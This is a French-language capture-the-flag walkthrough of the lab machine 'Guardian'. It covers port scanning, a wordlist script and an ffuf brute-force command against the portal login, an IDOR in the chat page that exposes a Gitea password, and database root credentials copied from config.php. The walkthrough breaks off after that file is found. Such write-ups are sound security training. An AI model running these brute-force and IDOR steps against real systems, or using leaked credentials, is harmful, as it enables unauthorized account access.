# Guardian


## Scan

On trouve 2 ports ouverts : 
	22/tcp open  ssh
	80/tcp open  http


On trouve un domaine et un sous domaine sur le serveur WEB : 
	- guardian.htb
	- portal.guardian.htb

On tombe sur une page de connexion.
On peut essayer de reinitialiser un mot de passe

On peut aussi trouver un fichier avec des instruction :

http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf

Ce fichier contient notament les mot de passe par défaut.
On peut essayer des nom d'utilisateur avec ce mot de passe pour voir si un utilisateur l'a encore


On sait que les nom d'utilisateur sont sous la forme :

GUXXXXXXX

mais cela fait beaucoup, soit 1 millions de possibilité.
Mais on a un exemple avec "GU2024001"

donc on peut partir sur le principe que les nom son sous la forme :
	- "GU2023XXX" 
	- "GU2024XXX"
	- "GU2025XXX"


Il faudra alors creer un wordlist de toutes ces possibilité.
J'ai donc ecrit un script pour creer les 3 fichier avec toutes les valeurs possible : 

```python3
years = [2023, 2024, 2025]

for year in years:
    filename = f"gen_{year}.txt"
    with open(filename, "w") as f:
        for number in range(1000):
            f.write(f"GU{year}{number:03d}\n")
```

```bash
ffuf -X POST -u http://portal.guardian.htb/login.php -d 'username=FUZZ&password=GU1234' -H 'Content-Type: application/x-www-form-urlencoded' -w gen.txt -fr 'Invalid username or password' -t 80 -fc 200
```

On trouve l'utilisateur suivant : 
	- GU0142023


On trouve un discution dans l'onglet chat


On tombe alors sur la 1er vulnérabilité dans l'onglet chat
L'URL de base  : 
	- http://portal.guardian.htb/student/chat.php?chat_users[0]=13&chat_users[1]=14

mais si on change les parametre : 
	- http://portal.guardian.htb/student/chat.php?chat_users[0]=1&chat_users[1]=2

On tombe alors sur une discution entre 2 personnes, avec un message important : 
	Here is your password for gitea: DHsNnk3V503 

Donc nous avons alors 2 informations, le gitea et un mot de passe.

On peut acceder a la page de connexion avec le sous-domaine gitea.guardian.htb

On peut alors utiliser l'un deux compte qui etait dans la conversation : 
	- jamil.enockson@guardian.htb
	- DHsNnk3V503


Dans le projet : portal.guardian.htb

On a un dossier "config" avec un fichier config.php avec les information suivant : 
```php
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'Gu4rd14n_un1_1s_th3_b3st',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```





